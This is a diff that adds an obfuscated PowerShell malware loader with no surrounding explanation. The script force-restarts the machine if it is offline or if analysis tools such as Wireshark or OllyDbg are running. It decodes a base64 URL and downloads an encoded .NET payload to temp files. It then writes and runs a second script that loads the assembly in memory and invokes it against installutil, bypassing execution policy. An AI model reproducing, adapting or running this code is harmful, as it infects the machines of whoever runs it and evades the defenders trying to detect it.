@@ -1,0 +1,18 @@
+Start-Sleep -Seconds 5; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
+;$result = Test-Connection 'www.google.com' -ErrorAction SilentlyContinue;
+$pingSuccessful = $result -is [Array];
+if ($pingSuccessful){
+
+}
+else{
+Restart-Computer -force ;
+      exit;
+};
+
+;if((get-process 'python', 'python3.13','tcpview', 'OLLYDBG','ImmunityDebugger', 'Wireshark','apateDNS','analyze' -ea SilentlyContinue) -eq $Null){ 
+       
+}
+else{ 
+Restart-Computer -force ;
+      exit;
+ };[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 ;$Stringbase;Function BaseMy{;$Zhtfq = [System.Text.Encoding]::UTF8.GetString([system.Convert]::FromBase64String($Stringbase));return $Zhtfq;};$gFJvC = ( [System.IO.Path]::GetTempPath() + 'ffsdy.txt' );$TpAAL = 'aHR0cHM6Ly9yd3Z5dC5jb20uYnIvVXBjcnlwdGVyLzAxL01ldXNBcnF1aXZvczAxLnR4dA==';$Stringbase = $TpAAL; $TpAAL = BaseMy;$TpAAL | Out-File -FilePath $gFJvC -Encoding 'UTF8' -force ;$JmpeA = ( [System.IO.Path]::GetTempPath() + 'tpcmg.txt' ) ;$ntsll = New-Object System.Net.WebClient ;$ntsll.Encoding = [System.Text.Encoding]::UTF8 ;$omPbl  = ( Get-Content -Path $gFJvC ) ;$jllni = $ntsll.DownloadData( $omPbl ) ;$ydjhs = [System.Text.Encoding]::UTF8.GetString($jllni);$ydjhs = @([regex]::split($ydjhs,'\%x%+'))[1];$ydjhs | Out-File -FilePath $JmpeA -force ;$jHQSW = 'Load';$KFcId = 'Invoke';$yJiEK = 'Domain';$npwtj = '$TMgRv = ''%base64%MC90bjBFQkNjSy9kL2VlLmV0c2FwLy86c3B0dGg='' ;$dqGlY = ( [System.IO.Path]::GetTempPath() + ''tpcmg.txt'' ) ; $ycYlM = (Get-Content -Path $dqGlY -Encoding UTF8);' ;$npwtj += '$ajwmH = $ycYlM.replace(''↓:↓'',''A'');' ;$npwtj += '[Byte[]] $Zhtfq = [system.Convert]::FromBase64String( $ajwmH ) ;' ;$npwtj += '[System.App' + $yJiEK + ']:' + ':Current' + $yJiEK + '.' + $jHQSW + '( $Zhtfq ).' ;$npwtj += 'GetType( ''ClassLibrary3.Class1'' ).GetM' ;$npwtj += 'ethod( ''prFVI'' ).' + $KFcId + '( $null , [object[]] ( $TMgRv , ''%FLCGo%'' , ''D D1Dc:\windows\microsoft.net\framework\v4.0.30319\installutil'' ) );' ;$hrlny = ( [System.IO.Path]::GetTempPath() + 'zrkcx.ps1' ) ;$npwtj | Out-File -FilePath $hrlny  -force ;powershell -ExecutionPolicy Bypass -File $hrlny ;
